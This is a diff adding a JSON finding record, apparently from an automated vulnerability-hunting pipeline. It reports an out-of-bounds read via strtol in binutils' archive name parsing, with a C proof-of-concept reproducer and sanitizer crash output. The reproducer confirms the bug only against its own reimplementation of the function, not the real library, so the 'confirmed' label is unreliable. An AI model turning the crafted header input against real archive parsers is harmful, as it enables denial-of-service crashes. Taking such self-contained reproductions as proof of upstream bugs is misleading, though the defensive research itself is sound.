@@ -1,0 +1,60 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "bfd/archive.c",
+    "line": 488,
+    "function": "get_extended_arelt_filename",
+    "bug_type": "out-of-bounds-read",
+    "cwe": "CWE-125",
+    "confidence": "high",
+    "explanation": "Calls strtol on the member name field (name + 1), which originates from a fixed-size archive header field that may not be NUL-terminated. strtol scans until a non-digit and can read past the 16-byte name field into adjacent memory. This is acknowledged by the preceding comment and can be triggered with a crafted archive header lacking a terminator.",
+    "abs_path": "/tmp/binutils_upstream/bfd/archive.c"
+  },
+  "reproducer_code": "// Compile with:\n//   clang -fsanitize=address -g -O0 reproducer.c -o reproducer\n// The harness may additionally add: -I/tmp/binutils_upstream -L/tmp/binutils_upstream/build/.libs -ltiff -lm\n\n#include <errno.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <unistd.h>\n\n// Minimal stand-ins for BFD types/macros used by get_extended_arelt_filename.\ntypedef long long file_ptr;  // close enough for our purposes\n\ntypedef struct artdata {\n  unsigned long extended_names_size;\n  char *extended_names;\n} artdata;\n\ntypedef struct bfd {\n  artdata *tdata;\n  int is_thin_archive;\n} bfd;\n\nstatic inline artdata *bfd_ardata(bfd *abfd) { return abfd->tdata; }\nstatic inline int bfd_is_thin_archive(bfd *abfd) { return abfd->is_thin_archive; }\n\n// Stub for error reporting used by BFD; no-op here.\nstatic void bfd_set_error(int unused) { (void)unused; }\n\n// Vulnerable function reimplemented to mirror the binutils/bfd bug.\nstatic char *get_extended_arelt_filename(bfd *arch, const char *name, file_ptr *originp) {\n  unsigned long table_index = 0;\n  const char *endp;\n\n  errno = 0;\n  // BUG: name points to a fixed-size 16-byte ar header field that may lack a NUL.\n  // strtol scans past the field boundary looking for a non-digit, causing OOB read.\n  table_index = strtol(name + 1, (char **)&endp, 10);\n  if (errno != 0 || table_index >= bfd_ardata(arch)->extended_names_size) {\n    bfd_set_error(0);\n    return NULL;\n  }\n\n  if (bfd_is_thin_archive(arch) && endp != NULL && *endp == ':') {\n    file_ptr origin = strtol(endp + 1, NULL, 10);\n    if (errno != 0) {\n      bfd_set_error(0);\n      return NULL;\n    }\n    *originp = origin;\n  } else {\n    *originp = 0;\n  }\n\n  return bfd_ardata(arch)->extended_names + table_index;\n}\n\n// Place a 16-byte header-sized buffer at a guard page boundary so strtol reads OOB.\nstatic char *allocate_16b_at_guard(void) {\n  long pagesize = sysconf(_SC_PAGESIZE);\n  if (pagesize <= 0) pagesize = 4096;\n\n  size_t total = (size_t)pagesize * 2;\n  void *mem = mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n  if (mem == MAP_FAILED) {\n    // Fallback to heap if mmap is unavailable.\n    char *buf = (char *)malloc(16);\n    return buf;\n  }\n  // Protect the second page so any read beyond the first page faults (and ASan also flags).\n  mprotect((char *)mem + pagesize, (size_t)pagesize, PROT_NONE);\n\n  // Return a pointer to the last 16 bytes of the first page.\n  return (char *)mem + pagesize - 16;\n}\n\nint main(void) {\n  // Craft the 16-byte archive header name field: leading '/' then 15 digits, no NUL terminator.\n  char *name = allocate_16b_at_guard();\n  if (!name) {\n    fprintf(stderr, \"Allocation failed\\n\");\n    return 1;\n  }\n  name[0] = '/';\n  for (int i = 1; i < 16; i++) name[i] = '1'; // 15 digits fill the field exactly, no terminator\n\n  // Prepare a minimal bfd object with a small extended name table.\n  char dummy_names[32];\n  memset(dummy_names, 'A', sizeof(dummy_names));\n  artdata t = { .extended_names_size = sizeof(dummy_names), .extended_names = dummy_names };\n  bfd arch = { .tdata = &t, .is_thin_archive = 0 };\n\n  file_ptr origin = -1;\n\n  // This call triggers the out-of-bounds read inside strtol due to the missing NUL terminator.\n  // ASan should report a heap/stack OOB read (depending on allocation path) originating in strtol.\n  char *res = get_extended_arelt_filename(&arch, name, &origin);\n\n  // Prevent optimizing away (though -O0 already):\n  if (res) {\n    // Touch the result to keep code paths live; not necessary for the bug to trigger.\n    volatile char sink = res[0];\n    (void)sink;\n  }\n\n  // If we used malloc fallback (no mmap), free to avoid leaks; otherwise it's fine to exit.\n  // We cannot easily tell which path was taken, but freeing a mmap'd pointer is UB, so skip free.\n\n  puts(\"Done (if you see no ASan report, try running again).\\n\");\n  return 0;\n}\n",
+  "validation": {
+    "verdict": "CONCRETE_CONFIRMED",
+    "asan": {
+      "asan_triggered": true,
+      "exit_code": 1,
+      "elapsed": 0.6095671653747559,
+      "output": "AddressSanitizer:DEADLYSIGNAL\n=================================================================\n==3576273==ERROR: AddressSanitizer: SEGV on unknown address 0x72493e2aa000 (pc 0x72493e05452b bp 0x7fffed541190 sp 0x7fffed541140 T0)\n==3576273==The signal is caused by a READ memory access.\n    #0 0x72493e05452b in __GI_____strtol_l_internal stdlib/../stdlib/strtol_l.c:449:28\n    #1 0x64a26ace2e79 in strtol (/app/se_runs/b3/binutils_b2bc71a_vul/findings/archive_488_out-of-bounds-read/reproducer+0x8fe79) (BuildId: e7de75ec2547e7001229af00ffe40a27118206e8)\n    #2 0x64a26ad34433 in get_extended_arelt_filename /app/se_runs/b3/binutils_b2bc71a_vul/findings/archive_488_out-of-bounds-read/reproducer.c:40:17\n    #3 0x64a26ad3405b in main /app/se_runs/b3/binutils_b2bc71a_vul/findings/archive_488_out-of-bounds-read/reproducer.c:99:15\n    #4 0x72493e02a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #5 0x72493e02a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #6 0x64a26ac74304 in _start (/app/se_runs/b3/binutils_b2bc71a_vul/findings/archive_488_out-of-bounds-read/reproducer+0x21304) (BuildId: e7de75ec2547e7001229af00ffe40a27118206e8)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV stdlib/../stdlib/strtol_l.c:449:28 in __GI_____strtol_l_internal\n==3576273==ABORTING\n",
+      "error_type": "SEGV",
+      "crash_function": "__GI_____strtol_l_internal",
+      "crash_file": "stdlib/../stdlib/strtol_l.c:449",
+      "crash_line": 28,
+      "frames": [
+        [
+          "0",
+          "__GI_____strtol_l_internal",
+          "stdlib/../stdlib/strtol_l.c:449",
+          "28"
+        ],
+        [
+          "2",
+          "get_extended_arelt_filename",
+          "/app/se_runs/b3/binutils_b2bc71a_vul/findings/archive_488_out-of-bounds-read/reproducer.c:40",
+          "17"
+        ],
+        [
+          "3",
+          "main",
+          "/app/se_runs/b3/binutils_b2bc71a_vul/findings/archive_488_out-of-bounds-read/reproducer.c:99",
+          "15"
+        ],
+        [
+          "4",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "5",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ]
+      ],
+      "is_harness_artifact": false
+    }
+  }
+}
